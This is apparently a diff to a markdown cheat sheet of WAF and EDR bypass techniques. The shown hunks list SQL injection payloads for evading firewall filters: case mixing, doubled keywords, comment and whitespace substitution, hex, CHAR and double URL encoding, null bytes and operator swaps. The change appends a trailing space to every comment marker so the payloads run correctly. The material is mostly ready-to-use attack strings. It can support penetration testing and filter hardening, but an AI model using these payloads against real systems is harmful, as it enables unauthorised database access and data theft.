@@ -11,8 +11,8 @@ Comprehensive collection of WAF and EDR bypass techniques organized by vulnerabi
 **Case Variation** - Mix upper/lower case to bypass simple keyword matching:
 
 ```sql
-' UnIoN SeLeCt 1,database(),3--
-' uNiOn SeLeCt 1,user(),3--
+' UnIoN SeLeCt 1,database(),3-- 
+' uNiOn SeLeCt 1,user(),3-- 
 ```
 
 **Inline Comments** - MySQL-specific comment syntax that bypasses keyword filters:
@@ -25,52 +25,52 @@ Comprehensive collection of WAF and EDR bypass techniques organized by vulnerabi
 **Double-Write** - When WAF removes keyword once, the remaining letters form the keyword:
 
 ```sql
-' UNUNIONION SELSELECTECT 1,database(),3--
-' UNIunionON SELselectECT 1,2,3--
+' UNUNIONION SELSELECTECT 1,database(),3-- 
+' UNIunionON SELselectECT 1,2,3-- 
 ```
 
 ### Space / Whitespace Alternatives
 
 ```sql
-'/**/UNION/**/SELECT/**/1,database(),3--
-'%0aUNION%0aSELECT%0a1,2,3--
-'(UNION(SELECT(1),(database()),(3)))--
-'UNION%20SELECT%201,2,3--
-'UNION+SELECT+1,2,3--
+'/**/UNION/**/SELECT/**/1,database(),3-- 
+'%0aUNION%0aSELECT%0a1,2,3-- 
+'(UNION(SELECT(1),(database()),(3)))-- 
+'UNION%20SELECT%201,2,3-- 
+'UNION+SELECT+1,2,3-- 
 ```
 
 ### Encoding Bypass
 
 ```sql
 -- Hex encoding
-' UNION SELECT 1,hex(database()),3--
-' UNION SELECT 1,unhex(hex(database())),3--
+' UNION SELECT 1,hex(database()),3-- 
+' UNION SELECT 1,unhex(hex(database())),3-- 
 
 -- Char encoding
-' UNION SELECT 1,CHAR(100,97,116,97,98,97,115,101),3--
+' UNION SELECT 1,CHAR(100,97,116,97,98,97,115,101),3-- 
 
 -- URL encoding
-%27%20UNION%20SELECT%201%2Cdatabase()%2C3--
+%27%20UNION%20SELECT%201%2Cdatabase()%2C3-- 
 
 -- Double URL encoding
-%2527%2520UNION%2520SELECT%25201%252Cdatabase()%252C3--
+%2527%2520UNION%2520SELECT%25201%252Cdatabase()%252C3-- 
 
 -- Null byte injection
-' UN%00ION SELECT 1,2,3--
+' UN%00ION SELECT 1,2,3-- 
 ```
 
 ### Operator Substitution
 
 ```sql
 -- Use AND/OR instead of &&
-' AND 1=1 UNION SELECT 1,2,3--
+' AND 1=1 UNION SELECT 1,2,3-- 
 
 -- Use || instead of OR in some contexts
-' || 1=1--
+' || 1=1-- 
 
 -- Comparison operator substitution
-' OR 'a' < 'b'--
-' OR 1 BETWEEN 1 AND 2--
+' OR 'a' < 'b'-- 
+' OR 1 BETWEEN 1 AND 2-- 
 ```
 
 ### MySQL-Specific Bypasses
